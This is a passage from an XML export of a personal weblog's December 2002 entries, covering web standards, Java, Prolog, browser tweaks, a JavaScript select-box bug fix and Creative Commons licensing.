Warning: &amp;gt;
  This is an error message
  for the log file
&lt;/pre&gt;
&lt;p&gt;YAML has a number of obvious influences, including Python and &lt;acronym title=&quot;Multipurpose Internet Mail Extensions&quot;&gt;MIME&lt;/acronym&gt;. Implementations already exist for &lt;a href=&quot;http://wiki.yaml.org/yamlwiki/YamlPm&quot; title=&quot;YamlPm&quot;&gt;Perl&lt;/a&gt;, &lt;a href=&quot;http://wiki.yaml.org/yamlwiki/PurePythonParserForYaml&quot; title=&quot;PurePythonParserForYaml&quot;&gt;Python&lt;/a&gt; and &lt;a href=&quot;http://helide.com/g/yaml/&quot; title=&quot;A YAML parser written in Java (work in progress)&quot;&gt;Java&lt;/a&gt;. &lt;acronym title=&quot;eXtensible Markup Language - Remote Procedure Calls&quot;&gt;XML-RPC&lt;/acronym&gt; aptly demonstrates how powerful the combination of lists, dictionaries and arrays can be for exchanging data between different systems and YAML looks like it offers a very nice alternative to XML based data structure syntax. I have to admit to being slightly concerned by the length of the specification - while YAML is definitely human readable it looks like it could take a while for a human to learn to write it. Then again, the actual generation of the format is meant to be handled by computers (I imagine that humans will make simple edits to YAML files more often than they create them from scratch) so the complexity of the more advanced parts of the specification is probably not too much of a problem.&lt;/p&gt;</field>
		<field name="created">2002-12-05 02:49:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">639</field>
		<field name="title">Java interfaces explained</field>
		<field name="slug">javaInterfacesExplained</field>
		<field name="body">&lt;p&gt;While browsing through &lt;a href=&quot;http://www.unix-girl.com/blog/archives/cat_java.html&quot;&gt;Kasia's Java Archives&lt;/a&gt; I came across &lt;a href=&quot;http://www.unix-girl.com/blog/archives/000375.html&quot; title=&quot;Interfaces are your friend&quot;&gt;this gem&lt;/a&gt; explaining why interfaces are such a useful feature of Java:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.unix-girl.com/blog/archives/000375.html&quot;&gt;&lt;p&gt;
One thing they do quite well is hide the implementation from the calling classes. Why is that good? Well, when you want to change the implementation you don't have to change the calling classes.. Saves time, saves work, saves QA resources, code is more readable, more versatile and easier to maintain. 
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I'd seen this explained before but the example Kasia provides finally made it click for me. Kasia also provides &lt;a href=&quot;http://www.unix-girl.com/blog/archives/000371.html&quot; title=&quot;Java stuff&quot;&gt;a link&lt;/a&gt; to &lt;a href=&quot;http://www.artima.com/designtechniques/&quot;&gt;Design Techniques&lt;/a&gt;, a collection of articles on good Java design. I just wish I'd found these before I started on our (now handed in) Java coursework.&lt;/p&gt;</field>
		<field name="created">2002-12-05 13:56:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">640</field>
		<field name="title">Vampire ecologies</field>
		<field name="slug">vampireEcologies</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.kryogenix.org/days/000382.cas&quot; title=&quot;More ecatchups&quot;&gt;Stuart's latest catchup&lt;/a&gt;, a scientific explanation of the &lt;a href=&quot;http://www.stanford.edu/~bthomas/vamp/vampecology.htm&quot;&gt;Vampire Population Ecology&lt;/a&gt; of Sunnydale.&lt;/p&gt;</field>
		<field name="created">2002-12-05 14:00:37</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">641</field>
		<field name="title">Prolog links</field>
		<field name="slug">prologLinks</field>
		<field name="body">&lt;p&gt;For my future reference, here are some useful Prolog sites I found over the past few days while working on my (now complete) Prolog coursework:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.swi-prolog.org/&quot;&gt;SWI-Prolog&lt;/a&gt; - an open source Prolog implementation, a version of which we used for the coursework. It is a surprisingly capable language - I was under the false impression that Prolog was just a tool for playing around with logic, but it turns out you can use it for complex software - it even has a cross platform &lt;acronym title=&quot;Graphical User Interface&quot;&gt;GUI&lt;/acronym&gt; toolkit.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.amzi.com/AdventureInProlog/&quot;&gt;Adventure in Prolog&lt;/a&gt; - a Prolog tutorial, culminating in the development of a full text-based adventure game.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://cbl.leeds.ac.uk/~paul/prologbook/&quot;&gt;Prolog Programming A First Course&lt;/a&gt; - a University tutorial providing some excellent theoretical background information (including predicate calculus) as well as good coverage of the language.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.xml.com/pub/a/2001/07/25/prologrdf.html&quot;&gt;RDF Applications with Prolog&lt;/a&gt; - an XML.com article explaining how SWI-Prolog's &lt;acronym title=&quot;Resource Description Framework&quot;&gt;RDF&lt;/acronym&gt; module can be used to work with RDF.&lt;/li&gt;
&lt;/ul&gt;</field>
		<field name="created">2002-12-07 22:37:20</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">642</field>
		<field name="title">The best 404 page ever</field>
		<field name="slug">theBest404PageEver</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://www.plinko.net/thebest404pageever&quot;&gt;best 404 page&lt;/a&gt; I have ever seen. Text reproduced here in case they ever change it:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.plinko.net/thebest404pageever&quot;&gt;&lt;pre&gt;
Once upon a midnight dreary, while I websurfed, weak and weary,
Over many a strange and spurious website of 'hot chicks galore',
While I clicked my fav'rite bookmark, suddenly there came a warning,
And my heart was filled with mourning, mourning for my dear amour.
&quot;'Tis not possible,&quot; I muttered, &quot;give me back my cheap hardcore!&quot; -
Quoth the server, &quot;404&quot;.
&lt;/pre&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-12-07 22:37:59</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">643</field>
		<field name="title">DHTML article deconstructed</field>
		<field name="slug">dhtmlArticleDeconstructed</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.webmasterbase.com/article/965/&quot;&gt;Create Pop-Up Notes with DHTML&lt;/a&gt; is a disappointing new article on SitePoint which describes a technique for having a yellow Post-It style note appear when a link is clicked. The example given is for a link that shows the un-abbreviated form of &lt;acronym title=&quot;National Aeronautics and Space Aministration&quot;&gt;NASA&lt;/acronym&gt; - a task better accomplished using the &lt;code&gt;acronym&lt;/code&gt; tag. In addition, I spotted the following problems with the article:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;The link that triggers the popup note uses &lt;code&gt;javascript:&lt;/code&gt; pseudo-protocol. This is bad! Scott Andrew posted a good rant about this &lt;a href=&quot;http://www.scottandrew.com/weblog/2002_05#a000284&quot; title=&quot;javascript: is deprecated. Don&amp;apos;t use it.&quot;&gt;back in May&lt;/a&gt;, and Evolt has an &lt;a href=&quot;http://www.evolt.org/article/Links_and_JavaScript_Living_Together_in_Harmony/17/20938/index.html&quot; title=&quot;Links &amp;amp; JavaScript Living Together in Harmony&quot;&gt;article&lt;/a&gt; explaining why &lt;code&gt;onclick&lt;/code&gt; is the preferable alternative.&lt;/li&gt;
&lt;li&gt;Although the effect uses both &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; and a &lt;code&gt;div&lt;/code&gt; element, the example code still recommends formatting the popup note using a fixed width table. This could be replaced by CSS styles on the &lt;code&gt;div&lt;/code&gt; - a yellow background, some padding and a width declaration.&lt;/li&gt;
&lt;li&gt;The code uses &lt;code&gt;visibility: hidden&lt;/code&gt; - &lt;code&gt;display: none&lt;/code&gt; has better browser support and would have the same end effect (the code would then need to toggle it to &lt;code&gt;display: block&lt;/code&gt; to make the note visible).&lt;/li&gt;
&lt;li&gt;The javascript uses &lt;code&gt;document.all&lt;/code&gt; to reference the specified div by default, with &lt;a href=&quot;http://www.xs4all.nl/~ppk/js/?support.html&quot; title=&quot;PPK&amp;apos;s excellent guide to object detection&quot;&gt;object detection&lt;/a&gt; used to provide support for Netscape 4 (shudder) and Netscape 6/Mozilla. &lt;code&gt;document.all&lt;/code&gt; was only ever used by &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;, and IE5 and above support the standards compliant &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; equivalent, &lt;code&gt;document.getElementById&lt;/code&gt; (which is also used by Mozilla). The only reason to use document.all is if you desperately need to support IE4, a browser who's market share is &lt;a href=&quot;http://www.thecounter.com/stats/2002/November/browser.php&quot; title=&quot;TheCounter.com stats for November 2002 - they&amp;apos;re by no means perfect, but they help prove a point.&quot;&gt;even less than Netscape 4&lt;/a&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;lloydi on the SitePoint forums made the &lt;a href=&quot;http://www.sitepointforums.com/showthread.php?postid=624604#post623527&quot; title=&quot;Forum Topic: Create Pop-Up Notes with DHTML&quot;&gt;excellent suggestion&lt;/a&gt; that the content of the notes should appear at the bottom of the page as footnotes, with the links that activate the popup notes doubling up as links to the footnote anchors. That way the content will stay accessible to user agents which do not support javascript.&lt;/p&gt;</field>
		<field name="created">2002-12-07 22:39:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">644</field>
		<field name="title">W3C redesign</field>
		<field name="slug">w3cRedesign</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://www.w3.org/&quot;&gt;W3C have redesigned&lt;/a&gt; to use &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; instead of tables (new layout &lt;a href=&quot;http://www.w3.org/2002/11/homepage&quot; title=&quot;W3C Home Page Table-less Layout: HOWTO and FAQ&quot;&gt;explained here&lt;/a&gt;). About time too! It's a shame the site still looks so, well, &lt;em&gt;ugly&lt;/em&gt;. I know it's a technical site and it doesn't have to look pretty but it would be a lot easier to convince designers to try out CSS and web standards if they didn't get instantly put off the &lt;acronym title=&quot;World Wide Web Consortium&quot;&gt;W3C&lt;/acronym&gt; by the ugliness of the front page.&lt;/p&gt;</field>
		<field name="created">2002-12-07 22:43:30</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">645</field>
		<field name="title">PHP for the enterprise</field>
		<field name="slug">phpForEnterprise</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.theopenenterprise.com/story/TOE20021204S0001/1&quot;&gt;PHP5: Ready For The Enterprise?&lt;/a&gt; (&lt;a href=&quot;http://radio.weblogs.com/0103807/2002/12/07.html#a1039&quot; title=&quot;PHP5&quot;&gt;via Scott&lt;/a&gt;) discusses forthcoming improvements in PHP5 and asks if they will lead to acceptance of PHP as a suitable language for enterprise applications. It looks like a killer factor could well be PHP's improved Java and .NET integration abilities. Write the back-end in Java/.NET and use PHP for the front end - that way you get a powerful web-specific scripting language for the front end of your site. Then if you ever need to change technologies on the back end your front end code can be reused.&lt;/p&gt;</field>
		<field name="created">2002-12-07 23:16:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">646</field>
		<field name="title">Phoenix 0.5 and mouse gestures</field>
		<field name="slug">phoenix05AndMouseGestures</field>
		<field name="body">&lt;p&gt;Phoenix 0.5 has &lt;a href=&quot;http://www.mozilla.org/projects/phoenix/phoenix-release-notes.html&quot; title=&quot;Phoenix 0.5 (Naples) Release Notes and FAQ&quot;&gt;been released&lt;/a&gt;, and so far it's an absolute dream. The Windows installer is a paltry 6.1 MB and it is noticable faster than Phoenix 0.4 - the initial speed boost was so impressive I spent several minutes loading up &lt;a href=&quot;http://www.msn.com/&quot;&gt;large, bloated sites&lt;/a&gt; just to admire the speed with which they appeared. The Phoenix team are aiming for a 5 MB Windows installer for the final release - here's hoping they manage it.&lt;/p&gt;

&lt;p&gt;Unfortunately there is still no menu option for the &lt;a href=&quot;http://texturizer.net/phoenix/extensions.html#gestures&quot; title=&quot;Phoenix Help: Extensions&quot;&gt;Mouse Gestures package&lt;/a&gt; to change the mouse button needed to trigger a gesture (it defaults to left but I much prefer right). If you want gestures to be linked to the right mouse button you'll need to do the following:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Install the gestures package from &lt;a href=&quot;http://texturizer.net/phoenix/extensions.html#gestures&quot; title=&quot;Phoenix Help: Extensions&quot;&gt;here&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Restart Phoenix, then close it down again. This adds the default gestures preferences to your &lt;code&gt;prefs.js&lt;/code&gt; file.&lt;/li&gt;
&lt;li&gt;Open the Phoenix &lt;code&gt;prefs.js&lt;/code&gt; file in a text editor. On Windows, you will find this in your Application Data file - mine (Win 98) is in &lt;code&gt;C:\Windows\Application Data\Phoenix\Profiles\User\x2p6afl9.slt&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Find the line containing &lt;code&gt;user_pref(&quot;mozgest.mousebutton&quot;, 0);&lt;/code&gt; and change the number to 2 (for right mouse button) or 1 (for middle mouse button).&lt;/li&gt;
&lt;li&gt;Save the file, reload Phoenix and you're done.&lt;/li&gt;
&lt;/ol&gt;</field>
		<field name="created">2002-12-08 15:28:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">647</field>
		<field name="title">The perils of semantic markup</field>
		<field name="slug">thePerilsOfSemanticMarkup</field>
		<field name="body">&lt;p&gt;Phil Ringnalda: &lt;a href=&quot;http://philringnalda.com/archives/002403.php&quot;&gt;The perils of good semantic markup&lt;/a&gt;. A throwaway comment by a blogger about some trashy manufactured band results in his (properly marked up) site ending ranked higher by Google than the official band's site for searches on their name. This results in a barrage of moronic fan comments and apparently an &lt;a href=&quot;http://www.ninjakitten.net/digiboy/2002_12.php#post000678&quot;&gt;even bigger barrage&lt;/a&gt; of moronic fan email.&lt;/p&gt;</field>
		<field name="created">2002-12-08 22:33:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">648</field>
		<field name="title">One time URLs with PHP</field>
		<field name="slug">oneTimeUrlsWithPhp</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.onlamp.com/pub/a/php/2002/12/05/one_time_URLs.html&quot;&gt;Generating One-Time URLs with PHP&lt;/a&gt; has some simple example code which demonstrates PHP's file locking functions in action.&lt;/p&gt;</field>
		<field name="created">2002-12-09 12:17:48</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">649</field>
		<field name="title">Striking the 1976 act</field>
		<field name="slug">strikingThe1976Act</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://cyberlaw.stanford.edu/lessig/blog/archives/2002_12.shtml#000670&quot; title=&quot;chaos II -- these numbers are AMAZING!&quot;&gt;Lawrence Lessig&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote cite=&quot;http://cyberlaw.stanford.edu/lessig/blog/archives/2002_12.shtml#000670&quot;&gt;&lt;p&gt;
Jason Schultz has done more amazing work calculating any &quot;chaos&quot; that would come from striking the 1976 Act. Using the Internet Movie Database, he confirmed the Copyright Office's numbers that about 37,000 movies were released in the period 1927-46. (IMDb reports 36,386). Of those, only 2,480 are currently available in any format, or 6.8%. 93.2% of the films during that period are are commercially dormant.
&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-12-09 12:18:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">650</field>
		<field name="title">Generics in java</field>
		<field name="slug">genericsInJava</field>
		<field name="body">&lt;p&gt;It looks like Java is set to get a new feature - Generics - in version 1.5. Generics are the Java equivalent of C++ templates; they severely help clear up confusions over types used with abstract data types such as lists and sets. &lt;a href=&quot;http://developer.java.sun.com/developer/technicalArticles/releases/generics/&quot;&gt;Preparing for Generics&lt;/a&gt; explains this new feature and the kind of problems it solves.&lt;/p&gt;</field>
		<field name="created">2002-12-09 12:28:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">651</field>
		<field name="title">Personal web proxies</field>
		<field name="slug">personalWebProxies</field>
		<field name="body">&lt;p&gt;Les Orchard is &lt;a href=&quot;http://www.decafbad.com/news_archives/000346.phtml&quot; title=&quot;Technology Ramblings :: Personal Web Proxies&quot;&gt;considering building his own web proxy&lt;/a&gt;. I had never thought about the possibilities of these technologies beyond caching before, but Les's post has really got me thinking. I often find myself searching around for a web page I visited a few months ago and can only vaguely remember - a proxy generated searchable history (I never got the hang of using my browser's) would be a very useful tool. In addition, the ability to cache local copies of useful documents to preserve them should the original ever go offline would be very handy. How about a proxy with an accompanying small GUI desktop application which shows your recent browsing history (the last 15 pages or so) and allows you to mark documents for bookmarking / preserving? The application and proxy server could communicate via &lt;acronym title=&quot;eXtensible Markup Language - Remote Procedure Calls&quot;&gt;XML-RPC&lt;/acronym&gt;.&lt;/p&gt;</field>
		<field name="created">2002-12-09 12:29:21</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">652</field>
		<field name="title">Why MSN Messenger sucks</field>
		<field name="slug">badInterfaceDesignFromMicrosof</field>
		<field name="body">&lt;p&gt;Acts of Volition: &lt;a href=&quot;http://actsofvolition.com/index.cfm?aticle=614#614&quot;&gt;What's wrong with MSN Messenger 5.0&lt;/a&gt;. I rarely load up MSN (I like to browse in peace) but I'd like to add a few points, aimed at Messenger in general rather than any particular version of the software:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;There is no way of setting the displayed name of people on your contact list.&lt;/strong&gt; To my mind, this is a critical design flaw. I have a number of people on my contact list who change their name, daily, to something obscure. I constantly see new names popping up on my list and the only way of telling who they are is to hover the mouse over them to see their email address and then try to match it with a real person from memory. This is not how software should work. With only a few name-changers on my list this is bearable but irritating - were the number to increase a primary function of the software (seeing which of my friends were online) would be practically invalidated.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;The interface looks more like a web page than an application.&lt;/strong&gt; Yesterday while logging on to my account through my girlfriend's PC I spend several frustrated seconds trying to find the &quot;log in as a different user&quot; option. My girlfriend pointed it out - it was right in front of my eyes, but Microsoft's interface designers in their eternal wisdom had chosen to make it look like a hyperlink rather than a button. I don't look for hyperlinks in applications, so my eyes had skipped right over it.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Steve observes that &lt;q cite=&quot;http://actsofvolition.com/index.cfm?aticle=614#614&quot;&gt;Microsoft's UI design teams seem to need to implement an entirely different interface scheme for every product line&lt;/q&gt;. I concurr - but I have trouble understanding the motivation behind this. From my (admitedly limited) knowledge of user interface design, two of the most important considerations are to keep things consistent and to observe the principle of least surprise (don't so anything unexpected). How the biggest sofware company in the world gets away with fragrantly ignoring these principles at every turn is beyond me.&lt;/p&gt;</field>
		<field name="created">2002-12-09 12:29:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">653</field>
		<field name="title">Opera usability problems</field>
		<field name="slug">operaUsabilityProblems</field>
		<field name="body">&lt;p&gt;Matthew Thomas lists &lt;a href=&quot;http://mpt.phrasewise.com/2002/12/08#a403&quot; title=&quot;Opera reprise&quot;&gt;21 usability problems&lt;/a&gt; with the Opera 7 beta.&lt;/p&gt;</field>
		<field name="created">2002-12-09 12:35:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">654</field>
		<field name="title">Coursework frenzy again</field>
		<field name="slug">courseworkFrenzyAgain</field>
		<field name="body">&lt;p&gt;Coursework frenzy is kicking in again. This time I have a large group project and two personal projects (one small, one large) due for Tuesday of next week. I'm clearing out my things-to-blog list and then I intend to knuckle down to some work.&lt;/p&gt;</field>
		<field name="created">2002-12-11 17:29:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">655</field>
		<field name="title">Lambda calculus links</field>
		<field name="slug">lambdaCalculusLinks</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.jetcafe.org/~jim/lambda.html&quot;&gt;An Introduction to Lambda Calculus and Scheme&lt;/a&gt; and &lt;a href=&quot;http://www.wikipedia.org/wiki/Lambda_calculus&quot;&gt;Wikipedia's Lambda Calculus page&lt;/a&gt; have both proved useful recently.&lt;/p&gt;</field>
		<field name="created">2002-12-11 17:30:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">656</field>
		<field name="title">A new source of rants</field>
		<field name="slug">newRantings</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://creamofbroccoli.org/&quot;&gt;Soup is Good&lt;/a&gt; is a new blog by &lt;a href=&quot;http://jeremy.zawodny.com/blog/archives/000341.html#000341&quot; title=&quot;Brandt&amp;apos;s Blog&quot;&gt;a friend of Jeremy Zawodny&lt;/a&gt;. It looks like one to watch - &lt;a href=&quot;http://creamofbroccoli.org/archives/000004.html#000004&quot; title=&quot;pet peeve #1&quot;&gt;two&lt;/a&gt; &lt;a href=&quot;http://creamofbroccoli.org/archives/000005.html#000005&quot; title=&quot;the wild, wild west&quot;&gt;quality&lt;/a&gt; rants and counting.&lt;/p&gt;</field>
		<field name="created">2002-12-11 17:31:44</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">657</field>
		<field name="title">Google roundup</field>
		<field name="slug">googleRoundup</field>
		<field name="body">&lt;p&gt;I've missed out on a whole bunch of &lt;a href=&quot;http://www.google.com/&quot;&gt;Google&lt;/a&gt; news lately (all of which has come via the &lt;a href=&quot;http://google.blogspace.com/&quot;&gt;Google Weblog&lt;/a&gt;). &lt;a href=&quot;http://labs.google.com/&quot;&gt;Google labs&lt;/a&gt; have a couple of interesting new demos; &lt;a href=&quot;http://labs.google.com/gviewer.html&quot;&gt;Google Viewer&lt;/a&gt;, a weird slideshow thing that cycles through search results for you using bizzare &lt;acronym title=&quot;Dynamic HyperText Markup Language&quot;&gt;DHTML&lt;/acronym&gt; and &lt;a href=&quot;http://labs.google.com/cgi-bin/webquotes&quot;&gt;Google Webquotes&lt;/a&gt;, which &lt;q cite=&quot;http://labs.google.com/cgi-bin/webquotes&quot;&gt;annotates the results of your Google search with comments from other websites&lt;/q&gt;. Google have also published their &lt;a href=&quot;http://www.google.com/press/timeline2002.html&quot;&gt;End-of-Year Zeitgeist&lt;/a&gt; which offers a unique overview of the year's events based on Google search statistics.&lt;/p&gt;</field>
		<field name="created">2002-12-11 17:34:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">658</field>
		<field name="title">Trade it on Trodo</field>
		<field name="slug">tradeItOnTrodo</field>
		<field name="body">&lt;p&gt;Adrian Holovaty has &lt;a href=&quot;http://www.holovaty.com/blog/archive/2002/12/09/1052&quot; title=&quot;Trade it on Trodo&quot;&gt;revealed&lt;/a&gt; his &lt;a href=&quot;http://www.holovaty.com/blog/archive/2002/11/25/1938&quot; title=&quot;A career move&quot;&gt;previously hinted at&lt;/a&gt; secret project. &lt;a href=&quot;http://www.trodo.com/&quot;&gt;Trodo.com&lt;/a&gt; is &lt;q cite=&quot;http://www.holovaty.com/blog/archive/2002/12/09/1052&quot;&gt; kind of an online bartering site&lt;/q&gt;. You give away stuff you no longer have a use for to earn credits, which you can then spend on requesting free items from other people. It's a very interesting idea, and the trading model is explained in depth in Adrian's &lt;a href=&quot;http://www.holovaty.com/blog/archive/2002/12/09/1052#comments&quot; title=&quot;Trade it on Trodo: Comments&quot;&gt;comments section&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-12-11 17:40:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">659</field>
		<field name="title">Lots to learn</field>
		<field name="slug">lotsToLearn</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.joelonsoftware.com/articles/LordPalmerston.html&quot; title=&quot;Joel on Software: Lord Palmerson on Programming&quot;&gt;There's a heck of a lot to learn&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-12-11 21:27:10</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">660</field>
		<field name="title">Interview with Tim Perdue</field>
		<field name="slug">interviewWithTimPerdue</field>
		<field name="body">&lt;p&gt;OSDir: &lt;a href=&quot;http://osdir.com/modules.php?op=modload&amp;amp;name=News&amp;amp;file=article&amp;amp;sid=102&quot;&gt;Interview with Tim Perdue. GForge and behind the scenes at SourceForge&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-12-11 23:22:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">661</field>
		<field name="title">Joe Clark interviews</field>
		<field name="slug">joeClarkInterviews</field>
		<field name="body">&lt;p&gt;On Monday, Slashdot posted an excellent &lt;a href=&quot;http://interviews.slashdot.org/article.pl?sid=02/12/09/1446221&quot; title=&quot;Joe Clark&amp;apos;s Answers -- In Valid XHTML&quot;&gt;in depth interview&lt;/a&gt; with Joe Clark, author of &lt;a href=&quot;http://www.joeclark.org/book/&quot;&gt;Building Accessible Websites&lt;/a&gt;. In a fantastic display of cluelessness they pasted the &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; document which Joe sent them straight in to the Slashdot template, &lt;code&gt;&amp;lt;html&amp;gt;&lt;/code&gt; tags and all. The good news is that there's more Joe Clark related goodness to come, &lt;a href=&quot;http://weblog.delacour.net/archives/000786.html&quot; title=&quot;Saved by the &amp;quot;title&amp;quot; attribute&quot;&gt;courtesy of Jonathan Delacour&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://weblog.delacour.net/archives/000786.html&quot;&gt;&lt;p&gt;
... since next week all my posts will be devoted to Joe Clark's Building Accessible Websites: first a book review, then an extended conversation with Joe about accessibility matters.
&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-12-12 12:32:34</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">662</field>
		<field name="title">Clearing a select box</field>
		<field name="slug">clearingASelectBox</field>
		<field name="body">&lt;p&gt;Deep in to coursework now, but I just spent more time than I care to mention struggling with what should have been a very simple task; removing all of the items from an &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; select box using Javascript. Here's the code that was causing me problems:&lt;/p&gt;

&lt;pre&gt;
endSelect = document.getElementById('endSelect');
/* Clear out the current options */
for (i = 0; i &amp;lt; endSelect.options.length; i++) {
    endSelect.options[i] = null;
}
&lt;/pre&gt;

&lt;p&gt;For some reason, this was only removing approximately half of the items in the list. I checked it in both IE and Phoenix and the same bug was evident, demonstrating that it was almost certainly a flaw in my code rather than a strange browser bug. After much tweaking and adding of &lt;code&gt;alert()&lt;/code&gt; debugging statements I realised my folly: Every time the loop went round I was removing an item from the list of items in the select box, but my code was not taking this in to account (a classic example of changing a data stucture while processing it). Once this had dawned on me the replacement code took a matter of moments:&lt;/p&gt;

&lt;pre&gt;
while (endSelect.options.length &amp;gt; 0) {
    endSelect.options[0] = null;
}
&lt;/pre&gt;

&lt;p&gt;Hopefully this will soon be Googled and will eventually save someone else from making the same stupid mistake.&lt;/p&gt;</field>
		<field name="created">2002-12-13 21:36:33</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">663</field>
		<field name="title">Creative commons launch</field>
		<field name="slug">creativeCommonsLaunch</field>
		<field name="body">
&lt;p&gt;&lt;a href=&quot;http://creativecommons.org/licenses/by/1.0&quot;&gt;&lt;img alt=&quot;Creative Commons License&quot; height=&quot;31&quot; src=&quot;http://creativecommons.org/images/public/somerights.gif&quot; width=&quot;88&quot; /&gt;&lt;/a&gt;&lt;br /&gt;
The contents of this weblog is licensed under a
&lt;a href=&quot;http://creativecommons.org/licenses/by/1.0&quot;&gt;Creative Commons License&lt;/a&gt;.&lt;/p&gt;



</field>
		<field name="created">2002-12-16 21:11:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">664</field>
		<field name="title">Coursework complete</field>
		<field name="slug">courseworkComplete</field>
		<field name="body">&lt;p&gt;Coursework is done and dusted; normal service can now resume :)&lt;/p&gt;</field>
		<field name="created">2002-12-19 00:15:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">665</field>
		<field name="title">Stuart on plays</field>
		<field name="slug">stuartOnPlays</field>
		<field name="body">&lt;p&gt;Stuart has some &lt;a href=&quot;http://www.kryogenix.org/days/000407.cas&quot; title=&quot;On plays&quot;&gt;interesting thoughts&lt;/a&gt; regarding Mark Pilgrim's latest entry: an &lt;a href=&quot;http://diveintomark.org/archives/2002/12/18.html#the_right_ones_in_the_right_order&quot; title=&quot;The right ones in the right order&quot;&gt;excerpt&lt;/a&gt; from &lt;cite&gt;The Real Thing&lt;/cite&gt;, a play by Tom Stoppard.&lt;/p&gt;</field>
		<field name="created">2002-12-19 00:15:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">666</field>
		<field name="title">Creative Commons copyright link</field>
		<field name="slug">creativeCommonsCopyrightLink</field>
		<field name="body">&lt;p&gt;It's great to see the &lt;a href=&quot;http://creativecommons.org/&quot;&gt;Creative Commons&lt;/a&gt; getting an overwhelmingly positive reception - as Lessig &lt;a href=&quot;http://cyberlaw.stanford.edu/lessig/blog/archives/2002_12.shtml#000737&quot; title=&quot;cc launch&quot;&gt;says on his blog&lt;/a&gt;, &lt;q cite=&quot;http://cyberlaw.stanford.edu/lessig/blog/archives/2002_12.shtml#000737&quot;&gt;'Tis the season to be giving, and this will be a great gift to the Commons&lt;/q&gt;. If you haven't seen their explanatory flash animation, &lt;a href=&quot;http://mirrors.creativecommons.org/&quot; title=&quot;Dubious permalink&quot;&gt;Get Creative&lt;/a&gt;, you should really check it out.&lt;/p&gt;

